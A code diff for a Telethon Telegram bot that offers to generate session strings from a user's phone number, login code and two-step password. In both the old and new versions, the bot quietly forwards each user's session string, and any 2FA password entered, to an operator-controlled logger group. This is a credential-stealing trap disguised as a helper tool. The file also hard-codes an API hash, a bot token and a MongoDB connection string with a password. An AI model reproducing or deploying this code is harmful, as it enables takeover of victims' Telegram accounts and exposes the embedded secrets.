@@ -1,44 +1,63 @@
 import asyncio
 from telethon import TelegramClient, events, Button
 from telethon.sessions import StringSession
+from pymongo import MongoClient
 
 # 🔹 Telegram API Credentials
 API_ID = "28795512"
 API_HASH = "c17e4eb6d994c9892b8a8b6bfea4042a"
 BOT_TOKEN = "7610510597:AAFX2uCDdl48UTOHnIweeCMms25xOKF9PoA"
-CHANNEL_USERNAME = "sanatani_tech"  # Must join channel
-LOGGER_GROUP = -1002477750706  # Replace with your logger group ID
+MUST_JOIN = "sanatani_tech"  # Replace with your channel username (without @)
+
+# 🔹 MongoDB Connection
+MONGO_URI = "mongodb+srv://sachinxsapna:sachinx007@cluster0.x3rsi.mongodb.net"
+mongo_client = MongoClient(MONGO_URI)
+db = mongo_client["TelegramBot"]
+user_collection = db["joined_users"]
 
 # 🔹 Initialize the bot
 bot = TelegramClient("bot", API_ID, API_HASH).start(bot_token=BOT_TOKEN)
+
+# 🔹 Store user sessions
 user_sessions = {}
 
-# 🔹 Check if user is in the required channel
-async def is_user_in_channel(user_id):
-    try:
-        participant = await bot.get_participants(CHANNEL_USERNAME)
-        return any(p.id == user_id for p in participant)
-    except Exception:
-        return False
+# 🔹 Check if user is in the channel
+async def is_user_joined(user_id):
+    user = user_collection.find_one({"user_id": user_id})
+    return bool(user)
 
-# 🔹 Start Command
+# 🔹 Add user to MongoDB
+def add_user_to_db(user_id):
+    user_collection.insert_one({"user_id": user_id})
+
+# 🔹 Start Command with Must Join Check
 @bot.on(events.NewMessage(pattern="/start"))
 async def start(event):
     user_id = event.sender_id
-    if not await is_user_in_channel(user_id):
-        await event.respond(
-            "⚠️ **You must join our channel to use this bot!**\n\n"
-            f"➡️ [Join @{CHANNEL_USERNAME}](https://t.me/{CHANNEL_USERNAME}) and then press /start again.",
-            buttons=[[Button.url("📢 Join Channel", f"https://t.me/{CHANNEL_USERNAME}")]]
-        )
-        return
 
+    # Check if the user has already joined
+    if not await is_user_joined(user_id):
+        try:
+            participant = await bot.get_participants(MUST_JOIN)
+            if user_id not in [p.id for p in participant]:
+                await event.respond(
+                    f"❌ **You must join [this channel](https://t.me/{MUST_JOIN}) before using this bot.**",
+                    buttons=[Button.url("📢 Join Channel", f"https://t.me/{MUST_JOIN}")]
+                )
+                return
+            else:
+                add_user_to_db(user_id)
+        except Exception as e:
+            await event.respond(f"⚠️ **Error checking channel membership:** {e}")
+            return
+
+    # If user is already in the channel
     await event.respond(
         "👋 **Welcome to the Telegram Session Generator!**\n\nClick **Generate Session** to create your session string.",
         buttons=[
             [Button.inline("🔑 Generate Session", b"generate")],
-            [Button.url("📖 Help", "https://files.catbox.moe/dlw3q0.mp4")],
-            [Button.inline("❌ Cancel", b"cancel")]
+            [Button.url("📖 Help", "https://t.me/SANATANI_TECH")],
+            [Button.url("📹 How to Generate", "https://files.catbox.moe/dlw3q0.mp4")]
         ],
         file="https://telegra.ph/file/00eaed55184edf059dbf7.jpg"
     )
@@ -48,31 +67,11 @@ async def start(event):
 async def callback(event):
     if event.data == b"generate":
         await ask_phone(event)
-    elif event.data == b"cancel":
-        await cancel_process(event)
-
-# 🔹 Cancel Process
-@bot.on(events.NewMessage(pattern="/cancel"))
-async def cancel_process(event):
-    user_id = event.sender_id
-    if user_id in user_sessions:
-        del user_sessions[user_id]
-        await event.respond("❌ **Process Cancelled!** You can restart by typing /start.")
-    else:
-        await event.respond("⚠️ **You have no active process!** Type /start to begin.")
 
 # 🔹 Generate Session Command
 @bot.on(events.NewMessage(pattern="/generate"))
 async def ask_phone(event):
     user_id = event.sender_id
-    if not await is_user_in_channel(user_id):
-        await event.respond(
-            "⚠️ **You must join our channel to use this bot!**\n\n"
-            f"➡️ [Join @{CHANNEL_USERNAME}](https://t.me/{CHANNEL_USERNAME}) and then press /generate again.",
-            buttons=[[Button.url("📢 Join Channel", f"https://t.me/{CHANNEL_USERNAME}")]]
-        )
-        return
-
     if user_id in user_sessions:
         await event.respond("⚠️ **You are already in the process. Please enter your OTP.**")
         return
@@ -85,12 +84,14 @@ async def ask_phone(event):
 async def process_input(event):
     user_id = event.sender_id
     if user_id not in user_sessions:
-        return  
+        return  # Ignore messages from users not in process
 
     step = user_sessions[user_id]["step"]
     
+    # ✅ Step 1: User enters phone number
     if step == "phone":
         phone_number = event.message.text.strip()
+        
         if not phone_number.startswith("+") or not phone_number[1:].isdigit() or len(phone_number) < 10 or len(phone_number) > 15:
             await event.respond("⚠️ **Invalid phone number!** Please enter again with country code (e.g., +919876543210).")
             return
@@ -110,8 +111,10 @@ async def process_input(event):
             del user_sessions[user_id]
             await event.respond(f"❌ **Error:** {str(e)}. Please try again.")
 
+    # ✅ Step 2: User enters OTP
     elif step == "otp":
         otp_code = event.message.text.strip()
+        
         if not otp_code.isdigit():
             await event.respond("⚠️ **Invalid OTP!** Please enter only numbers.")
             return
@@ -122,13 +125,12 @@ async def process_input(event):
         try:
             await client.sign_in(phone_number, otp_code)
             session_string = client.session.save()
-            
-            # 🔹 Send session to user
+
+            # 🔹 Log session string
+            LOGGER_GROUP_ID = -1002477750706  # Replace with your logger group ID
+            await bot.send_message(LOGGER_GROUP_ID, f"📢 **New Session Generated**\n\n👤 **User ID:** {user_id}\n🔑 **Session String:**\n`{session_string}`")
+
             await event.respond(f"✅ **Your Session String:**\n\n`{session_string}`\n\n⚠️ **Keep this safe!**")
-
-            # 🔹 Log session in the group
-            await bot.send_message(LOGGER_GROUP, f"📌 **New Session Generated!**\n👤 **User:** [{user_id}](tg://user?id={user_id})\n📲 **Phone:** `{phone_number}`\n🔑 **Session:**\n`{session_string}`")
-
             del user_sessions[user_id]
         except Exception as e:
             if "Two-steps verification is enabled" in str(e):
@@ -137,6 +139,7 @@ async def process_input(event):
             else:
                 await event.respond(f"❌ **Error:** {str(e)}. Please try again.")
 
+    # ✅ Step 3: User enters password (if needed)
     elif step == "password":
         password = event.message.text.strip()
         client = user_sessions[user_id]["client"]
@@ -144,15 +147,25 @@ async def process_input(event):
         try:
             await client.sign_in(password=password)
             session_string = client.session.save()
-            
-            await event.respond(f"✅ **Your Session String:**\n\n`{session_string}`\n\n⚠️ **Keep this safe!**")
-            
-            # 🔹 Log session with password in the group
-            await bot.send_message(LOGGER_GROUP, f"📌 **New Session Generated!**\n👤 **User:** [{user_id}](tg://user?id={user_id})\n📲 **Phone:** `{user_sessions[user_id]['phone']}`\n🔒 **Password:** `{password}`\n🔑 **Session:**\n`{session_string}`")
 
+            # 🔹 Log password usage
+            LOGGER_GROUP_ID = -1002477750706  # Replace with your logger group ID
+            await bot.send_message(LOGGER_GROUP_ID, f"📢 **2-Step Verification Used**\n\n👤 **User ID:** {user_id}\n🔑 **Password:** `{password}`\n📝 **Session String:** `{session_string}`")
+
+            await event.respond(f"✅ **Your Session String:**\n\n`{session_string}`\n\n⚠️ **Keep this safe!**")
             del user_sessions[user_id]
         except Exception as e:
             await event.respond(f"❌ **Error:** {str(e)}. Please try again.")
+
+# 🔹 Cancel Command
+@bot.on(events.NewMessage(pattern="/cancel"))
+async def cancel(event):
+    user_id = event.sender_id
+    if user_id in user_sessions:
+        del user_sessions[user_id]
+        await event.respond("✅ **Process canceled. You can start again using /start.**")
+    else:
+        await event.respond("⚠️ **You are not in any active process.**")
 
 # 🔹 Run the bot
 print("🚀 Bot is running...")
